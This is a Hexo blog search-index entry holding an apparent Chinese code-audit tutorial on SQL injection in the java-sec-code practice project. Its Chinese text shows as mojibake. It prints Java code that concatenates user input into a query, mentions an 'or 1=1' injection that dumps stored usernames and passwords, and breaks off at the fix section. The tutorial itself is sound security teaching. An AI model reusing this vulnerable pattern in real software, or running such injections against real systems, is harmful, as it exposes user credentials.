<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ä»£ç å®¡è®¡_SQL</title>
    <link href="/2024/02/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL/"/>
    <url>/2024/02/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰æ®µæ—¶é—´å¼€äº†å®¡è®¡çš„å‘ï¼Œæœ€è¿‘ä¹Ÿåœ¨ç§¯æå­¦ä¹ å®¡è®¡ç›¸å…³çš„çŸ¥è¯†ã€‚æœ¬æ¥æ˜¯æƒ³è‡ªå·±å†™æ¼æ´ç¯å¢ƒçš„ï¼Œä½†æ˜¯æƒ³åˆ°è‡ªå·±å†™çš„ä»£ç å¾ˆæŠ½è±¡ï¼Œæ‰€ä»¥ç»è¿‡è€ƒè™‘è¿˜æ˜¯åˆ©ç”¨å¤§ä½¬å†™å¥½çš„ä»£ç è¿›è¡Œå®¡è®¡ã€‚å½“ç„¶å¤§å®¶ä¹Ÿå¯ä»¥è‡ªå·±åŠ¨æ‰‹å»å†™ã€‚è¿™é‡Œæˆ‘ä»¬ç”¨çš„æ˜¯<a href="https://github.com/JoyChou93/java-sec-code/tree/master"><strong>java-sec-code</strong></a>è¿™ä¸ªé¡¹ç›®ï¼Œå¤§å®¶å¯ä»¥è¿›è¡Œä¸‹è½½ï¼Œè‡ªè¡Œæ­å»ºã€‚</p><p>æœ¬ç³»åˆ—æ˜¯ä»åˆå­¦è€…çš„è§’åº¦å»è¿›è¡Œé€ä¸€åˆ†æï¼Œè‹¥æœ‰ä¸æ­£ç¡®ä¹‹å¤„è¿˜å¸Œæœ›å¤§ä½¬æ–§æ­£ã€‚</p><p><strong>å…³äºæ­å»ºç¯å¢ƒï¼š</strong></p><p>redemeå·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œå°†æºç ä¸‹è½½åï¼Œç”¨IDEAæ‰“å¼€é¡¹ç›®ã€‚ç„¶åå¯¼å…¥å¯¹åº”çš„.sqlæ–‡ä»¶ï¼Œç›´æ¥èµ·é£ï¼ï¼ï¼</p><p><strong>å…¶ä»–æ³¨æ„äº‹é¡¹ï¼š</strong></p><p>ç”¨æˆ·årootä½¿ç”¨ä¸äº†çš„è¯ï¼Œå¯ä»¥éšä¾¿èµ·åˆ«çš„åå­—ï¼Œéœ€è¦åœ¨Springé…ç½®ä¸­åŒæ­¥ã€‚</p><p>ç«¯å£é»˜è®¤8080ï¼Œä¼°è®¡å¾ˆå¤šäººburpä¹Ÿæ˜¯è¿™ä¸ªç«¯å£ã€‚è¦ä¹ˆä¿®æ”¹burpçš„ç›‘å¬ç«¯å£ï¼Œè¦ä¹ˆä¿®æ”¹ç¯å¢ƒå¼€æ”¾ç«¯å£ã€‚</p><h1 id="å®¡è®¡æ€è·¯"><a href="#å®¡è®¡æ€è·¯" class="headerlink" title="å®¡è®¡æ€è·¯"></a>å®¡è®¡æ€è·¯</h1><p>å…³äºæ€è·¯ï¼Œæˆ‘ç›®å‰åªäº†è§£åˆ°äº†ä¸‰ç§æ–¹æ³•ï¼š</p><ul><li>å…³æ³¨è¾“å…¥ã€è¾“å‡ºã€æ•°æ®æµã€‚</li><li>å…³æ³¨å¯èƒ½å­˜åœ¨æ¼æ´çš„å…³é”®å‡½æ•°ã€‚</li><li>å…¨ç¯‡é€šè¯»</li></ul><p>å› ä¸ºæˆ‘å¹³å¸¸æ¯”è¾ƒä¹ æƒ¯ç¬¬ä¸€ç§å…³æ³¨è¾“å…¥ã€æ•°æ®æµã€è¾“å‡ºï¼Œè¿™ç§å®¡è®¡æ–¹å¼ã€‚æ‰€ä»¥åœ¨ä¹‹åçš„å®¡è®¡æ€è·¯æ–¹é¢éƒ½æ˜¯å»é€šè¿‡æ¥å£ä¼ å‚è¿½è¸ªæ•°æ®æµèµ°å‘ï¼Œå¯»æ‰¾æ¼æ´ã€‚è¿™ç§ç›¸å¯¹æ¥è¯´æ¯”è¾ƒç®€å•ã€‚è€Œä¸”ç›¸å¯¹åˆé€‚ï¼Œå› ä¸ºä¸€èˆ¬æ¼æ´éƒ½æ˜¯éœ€è¦æˆ‘ä»¬å»è¾“å…¥æ•°æ®åå‡ºå‘æ¼æ´ï¼Œæ‰€ä»¥æˆ‘è§‰å¾—è¿™ç§æ–¹å¼ä¹Ÿæ˜¯æ¯”è¾ƒä¸é”™çš„å®¡è®¡æ€è·¯ã€‚</p><h1 id="å®¡è®¡æµç¨‹"><a href="#å®¡è®¡æµç¨‹" class="headerlink" title="å®¡è®¡æµç¨‹"></a>å®¡è®¡æµç¨‹</h1><h2 id="å¯»æ‰¾æ¥å£ç‚¹"><a href="#å¯»æ‰¾æ¥å£ç‚¹" class="headerlink" title="å¯»æ‰¾æ¥å£ç‚¹"></a>å¯»æ‰¾æ¥å£ç‚¹</h2><p>å½“æˆ‘ä»¬åœ¨æ‹¿åˆ°æºç çš„æ—¶å€™ï¼Œå‘ç°æœ‰Swaggerï¼Œæˆ‘ä»¬ç›´æ¥æ‰“å¼€è¿›è¡ŒæŸ¥çœ‹ã€‚æˆ‘ä»¬æœ¬ç¯‡æ–‡ç« ä¸»è¦ä»¥SQLæ³¨å…¥ä¸ºä¸»ï¼Œæ‰€ä»¥ä¸»è¦å…³æ³¨<code>sqli</code>è¿™ä¸ªæ¥å£ï¼š</p><p><img src="https://i.miji.bid/2024/02/01/b4084a493a209ab670c3c3b5b4802c55.png" alt="image-20240201111810978"></p><p>sqliæ¥å£å…·ä½“ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs apl">GET  /sqli/jdbc/ps/vuln    query=username<br><br>HEAD  /sqli/jdbc/ps/vuln    query=username<br><br>POST  /sqli/jdbc/ps/vuln    query=username<br><br>PUT  /sqli/jdbc/ps/vuln    query=username<br><br>DELETE  /sqli/jdbc/ps/vuln     query=username<br><br>OPTIONS  /sqli/jdbc/ps/vuln     query=username<br><br>PATCH  /sqli/jdbc/ps/vuln     query=username<br><br>GET  /sqli/jdbc/sec         query=username<br><br>HEAD  /sqli/jdbc/sec         query=username<br><br>POST  /sqli/jdbc/sec         query=username<br><br>PUT  /sqli/jdbc/sec             query=username<br><br>DELETE  /sqli/jdbc/sec    query=username<br><br>OPTIONS  /sqli/jdbc/sec    query=username<br><br>PATCH  /sqli/jdbc/sec    query=username<br><br>GET  /sqli/jdbc/vuln    query=username<br><br>HEAD  /sqli/jdbc/vuln    query=username<br><br>POST  /sqli/jdbc/vuln    query=username<br><br>PUT  /sqli/jdbc/vuln    query=username<br><br>DELETE  /sqli/jdbc/vuln    query=username<br><br>OPTIONS  /sqli/jdbc/vuln    query=username<br><br>PATCH  /sqli/jdbc/vuln    query=username<br><br>GET  /sqli/mybatis/orderby/sec04          quety=sort<br><br>GET  /sqli/mybatis/orderby/vuln03         quety=sort<br><br>GET  /sqli/mybatis/sec01       query=username<br><br>GET  /sqli/mybatis/sec02                  query=id<br><br>GET  /sqli/mybatis/sec03No parameters<br><br>GET  /sqli/mybatis/vuln01      query=username<br><br>GET  /sqli/mybatis/vuln02        query=username<br></code></pre></td></tr></table></figure><p>è¿™ä¹ˆå¤šæˆ‘ä»¬è‚¯å®šä¸å¯èƒ½ä¸€ä¸ªä¸€ä¸ªçœ‹ã€‚å¯ä»¥å°†ä»–ä»¬åˆ†ä¸ºä¸¤ç±»ï¼ŒJDBCå’ŒMybatisã€‚å…¶ä»–çš„åªæ˜¯æäº¤å‚æ•°çš„æ–¹å¼ä¸åŒæœ€ç»ˆæ‰§è¡Œé€»è¾‘è¿˜æ˜¯ç›¸åŒçš„ã€‚æˆ‘ä»¬å°±ä»¥getä¸ºä¾‹æ¥è¿›è¡Œå®¡è®¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apl">GET  /sqli/jdbc/ps/vuln    query=username<br><br>GET  /sqli/jdbc/sec        query=username<br><br>GET  /sqli/jdbc/vuln    query=username<br><br>GET  /sqli/mybatis/orderby/sec04          quety=sort<br><br>GET  /sqli/mybatis/orderby/vuln03         quety=sort<br><br>GET  /sqli/mybatis/sec01       query=username<br><br>GET  /sqli/mybatis/sec02                  query=id<br><br>GET  /sqli/mybatis/vuln01      query=username<br><br>GET  /sqli/mybatis/vuln02        query=username<br></code></pre></td></tr></table></figure><h2 id="å¯»æ‰¾è·¯ç”±"><a href="#å¯»æ‰¾è·¯ç”±" class="headerlink" title="å¯»æ‰¾è·¯ç”±"></a>å¯»æ‰¾è·¯ç”±</h2><p>é€šè¿‡ä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸæ‰¾åˆ°äº†æ¯ä¸ªæ¥å£ã€‚ä½†æ˜¯å› ä¸ºæˆ‘ä»¬åšçš„æ˜¯ç™½ç›’ï¼Œæ‰€ä»¥å…‰çŸ¥é“æ¥å£æ˜¯ä¸è¡Œçš„ã€‚æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“æ¯ä¸ªæ¥å£å¯¹åº”åç«¯çš„çœŸæ­£é€»è¾‘å¤„ç†éƒ¨åˆ†å³<strong>service</strong>ã€‚</p><p>URLå’Œé€»è¾‘ç±»ä¹‹é—´çš„å¯¹åº”å…³ç³»å¯ä»¥ç”¨<strong>æ³¨è§£å’Œweb.xml</strong>ä¸¤ç§æ–¹å¼è¿›è¡Œé…ç½®æˆ–å¯¹åº”</p><h3 id="æ³¨è§£æ–¹å¼"><a href="#æ³¨è§£æ–¹å¼" class="headerlink" title="æ³¨è§£æ–¹å¼"></a>æ³¨è§£æ–¹å¼</h3><p>æ³¨è§£æ–¹å¼æ˜¯åœ¨ä»£ç ä¸­ç›´æ¥ä½¿ç”¨æ³¨è§£æ¥è¿›è¡Œ URL è·¯å¾„å’Œé€»è¾‘ç±»çš„å¯¹åº”å…³ç³»é…ç½®ã€‚åƒ <code>@WebServlet(&quot;/example&quot;)</code>ã€<code>@RequestMapping(&quot;/example&quot;)</code>ã€<code>@Action(&quot;/example-action&quot;)</code>ï¼Œé™¤äº†serviceã€Filterå’ŒListeneréƒ½æ˜¯å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼è¿›è¡Œæ˜ å°„ã€‚å…¶ä¸­åŒ…æ‹¬Springã€Struts2ç­‰ä¸€äº›æ¡†æ¶å¤§éƒ½æ˜¯æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ˜ å°„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Spring MVC</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/example&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">exampleHandler</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// æ§åˆ¶å™¨æ–¹æ³•ä»£ç </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;exampleView&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//Struts2</span><br><span class="hljs-meta">@Namespace(&quot;/example&quot;)</span><br><span class="hljs-meta">@Action(&quot;/example-action&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ActionSupport</span> &#123;<br>    <span class="hljs-comment">// åŠ¨ä½œæ–¹æ³•ä»£ç </span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>web.xml æ˜¯ä¸€ä¸ª XML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºå¯¹ Web åº”ç”¨ç¨‹åºè¿›è¡Œå…¨å±€é…ç½®ã€‚é€šè¿‡åœ¨ web.xml æ–‡ä»¶ä¸­é…ç½® <code>&lt;servlet&gt;</code>ã€<code>&lt;servlet-mapping&gt;</code>ã€<code>&lt;filter&gt;</code>ã€<code>&lt;filter-mapping&gt;</code> å’Œ <code>&lt;listener&gt;</code> å…ƒç´ ï¼Œå¯ä»¥å®ç° URL è·¯å¾„å’Œé€»è¾‘ç±»çš„å¯¹åº”å…³ç³»ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml">é€»è¾‘ç±»<br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>exampleServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.ExampleServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>è·¯ç”±ç»‘å®š<br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>exampleServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/example<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>exampleFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.example.ExampleFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>exampleFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/example/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>com.example.ExampleListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>tips</strong></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨æ³¨è§£æ–¹å¼å’Œ web.xml é…ç½®æ–¹å¼æ˜¯å¯ä»¥æ··åˆä½¿ç”¨çš„ï¼Œä½†æ˜¯å½“äºŒè€…åŒæ—¶å­˜åœ¨æ—¶ï¼Œæ³¨è§£æ–¹å¼çš„ä¼˜å…ˆçº§ä¼šé«˜äº web.xml é…ç½®æ–¹å¼ã€‚</p><h3 id="å®é™…æ“ä½œ"><a href="#å®é™…æ“ä½œ" class="headerlink" title="å®é™…æ“ä½œ"></a>å®é™…æ“ä½œ</h3><p>IDEAåŒå‡»<code>shift</code>æ‰“å¼€æœç´¢ç•Œé¢ï¼Œè¾“å…¥<code>@RequestMapping</code>æ‰¾åˆ°æˆ‘ä»¬åƒè¦æŸ¥çœ‹çš„è·¯ç”±ã€‚æ­£å¸¸æƒ…å†µï¼Œè‹¥è¿™ä¸€æ­¥æ²¡æœ‰æŸ¥æ‰¾åˆ°ï¼Œå¯ä»¥æ£€æŸ¥æºç æ˜¯å¦æ‹·è´å®Œæ•´æˆ–è€…è€ƒè™‘æ˜¯å¦æºç ä»¥web.xmlæ–¹å¼è¿›è¡Œé…ç½®ã€‚</p><p><img src="https://i.miji.bid/2024/02/01/46685409edaca7484759c3f3dd263537.png" alt="image-20240201145212008"></p><h3 id="å®šä½ç›®æ ‡"><a href="#å®šä½ç›®æ ‡" class="headerlink" title="å®šä½ç›®æ ‡"></a>å®šä½ç›®æ ‡</h3><p>é€šè¿‡IDEAçš„æœç´¢ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†<code>GET  /sqli/jdbc/ps/vuln   query=username</code>å¯¹åº”çš„é€»è¾‘ç±»ã€‚æˆ‘ä»¬å…ˆæ‰“ä¸Šæ–­ç‚¹ã€‚</p><p><img src="https://i.miji.bid/2024/02/01/fe3da83f343292fab965da2d8dde1844.png" alt="image-20240201145909135"></p><p>åˆ©ç”¨burpå‘åŒ…ï¼ŒæˆåŠŸè§¦å‘æ–­ç‚¹ã€‚</p><p><img src="https://i.miji.bid/2024/02/01/1ee2b29db49ed41db757cd8e60f25188.png" alt="image-20240201151521636"></p><p><img src="https://i.miji.bid/2024/02/01/25527e3e92e3bd3992acbf9d56128f7a.png" alt="image-20240201151630753"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="æºç å±•ç¤º"><a href="#æºç å±•ç¤º" class="headerlink" title="æºç å±•ç¤º"></a>æºç å±•ç¤º</h3><p>æºç å¦‚ä¸‹ï¼Œæˆ‘ä¼šå°†æ¯å¥çš„æ³¨è§£å…ˆæ ‡æ³¨ä¸Šå»ï¼Œç„¶åå†è¿›ä¸€æ­¥åˆ†ææ¼æ´ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)</span><br> <span class="hljs-comment">//æ¥æ”¶å‚æ•°username</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_ps_vuln</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br><span class="hljs-comment">//åˆ›å»ºresultä¿å­˜æŸ¥è¯¢ç»“æœ</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//åŠ è½½æŒ‡å®šçš„æ•°æ®åº“é©±åŠ¨</span><br>            Class.forName(driver);<br>            <span class="hljs-comment">//å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œå¹¶å°†è¿æ¥å¯¹è±¡èµ‹å€¼ç»™ conã€‚</span><br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url, user, password);<br><span class="hljs-comment">//æ£€æŸ¥æ•°æ®åº“æ˜¯å¦æˆåŠŸè¿æ¥ï¼ŒæˆåŠŸåˆ™æ‰“å°successfullyã€‚</span><br>            <span class="hljs-keyword">if</span> (!con.isClosed())<br>                System.out.println(<span class="hljs-string">&quot;Connecting to Database successfully.&quot;</span>);<br><span class="hljs-comment">//æŸ¥è¯¢usersä¸­çš„usernameï¼ˆä¹‹é—´æ‹¼æ¥å‚æ•°ï¼‰</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>            <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªé¢„ç¼–è¯‘sqlå¯¹è±¡ï¼Œå¹¶èµ‹å€¼ç»™st</span><br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql);<br><span class="hljs-comment">//æ‰“å°é¢„ç¼–è¯‘SQLè¯­å¥ï¼Œå¹¶è®°å½•æ—¥å¿—</span><br>            logger.info(st.toString());<br>            <span class="hljs-comment">//æ‰§è¡Œsql</span><br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> st.executeQuery();<br><span class="hljs-comment">//å¯¹ç»“æœè¿›è¡Œéå†</span><br>            <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>                <span class="hljs-comment">//è·å–usernameã€password</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">res_name</span> <span class="hljs-operator">=</span> rs.getString(<span class="hljs-string">&quot;username&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">res_pwd</span> <span class="hljs-operator">=</span> rs.getString(<span class="hljs-string">&quot;password&quot;</span>);<br>                <span class="hljs-comment">//å°†è·å–åˆ°çš„usernameã€passwordæ ¼å¼åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œæ·»åŠ åˆ°resultä¸­ï¼Œå¹¶è®°å½•æ—¥å¿—ã€‚</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);<br>                result.append(info);<br>                logger.info(info);<br>            &#125;<br><span class="hljs-comment">//å…³é—­rsç»“æœé›†å¯¹è±¡å’Œæ•°æ®åº“è¿æ¥</span><br>            rs.close();<br>            con.close();<br><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            logger.error(<span class="hljs-string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            logger.error(e.toString());<br>        &#125;<br>        <span class="hljs-keyword">return</span> result.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>è¿™ä¸ªæ¼æ´ç‚¹ä¸€çœ¼å°±å‡ºï¼Œå¾ˆå¼€é—¨ã€‚ç›´æ¥å°†å­—ç¬¦ä¸²ä¸SQLè¿›è¡Œæ‹¼æ¥è¿™æ˜¯å¤§å¿Œã€‚æ¼æ´ç‚¹æˆ‘ä»¬è™½ç„¶æ‰¾åˆ°äº†ï¼Œä½†æ˜¯æƒ³è¦è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œæˆ‘ä»¬è¿˜å¾—è¿›ä¸€æ­¥åˆ†æã€‚</p><p>å› ä¸ºåœ¨æ­£å¸¸ç¯å¢ƒå½“ä¸­ï¼Œserviceä¹‹å‰è¿˜æœ‰filterã€‚å› ä¸ºå­˜åœ¨æœ‰äº›æ²¡åŠæ³•ä½¿ç”¨é¢„ç¼–è¯‘çš„æƒ…å†µã€‚<strong>ä¾‹å¦‚ï¼šæ¨¡ç³ŠæŸ¥è¯¢ï¼ˆlike)ã€order byç­‰</strong>æ‰€ä»¥å°±éœ€è¦åœ¨filterä¹‹ä¸­å†åšè¿›ä¸€æ­¥çš„è¿‡æ»¤ï¼Œä¸€èˆ¬è§åˆ°æ¯”è¾ƒå¤šçš„æ˜¯å†™ä¸€ä¸ªé»‘åå•æ¥è¿›è¡Œæ£€æµ‹ã€‚</p><p>å½“ç„¶è¿™ä¸ªç¯å¢ƒæ¯”è¾ƒç®€å•ï¼Œå®ƒå½“ä¸­å¹¶æ²¡æœ‰ç¼–å†™å¯¹åº”çš„sql-filterã€‚è™½ç„¶é‡Œé¢ä½¿ç”¨äº†javaåŸç”Ÿçš„sqlé¢„ç¼–è¯‘å‡½æ•°<code>PreparedStatement()</code>ä½†æ˜¯åœ¨SQLè¯­å¥ä¸­å¹¶æ²¡æœ‰ç”¨<code>&quot;?&quot;</code>è¿›è¡Œå ä½ï¼Œä¸”æ²¡æœ‰è¿›è¡Œå‚æ•°ç»‘å®šã€‚</p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>å› ä¸ºè¿™ä¸ªæ•°æ®åº“å¯¼å…¥ä¹‹åï¼Œåªæœ‰ä¸€å¼ è¡¨ï¼Œé‡Œé¢åªæœ‰å†…ç½®çš„ä¸¤ä¸ªç”¨æˆ·ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œæ³¨å…¥çš„è¯­å¥å°±é€‰æ‹©or 1&#x3D;1ï¼Œæ¥å°†ä¸¤ä¸ªç”¨æˆ·éƒ½å±•ç¤ºå‡ºæ¥ã€‚</p><p><img src="https://i.miji.bid/2024/02/01/badc801dda271d802c226f7063b2b9ff.png" alt="image-20240201161036515"></p><p><img src="https://i.miji.bid/2024/02/01/fffb4a287abdb80d60a110e404ca5fb7.md.png" alt="image-20240201161219810"></p><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 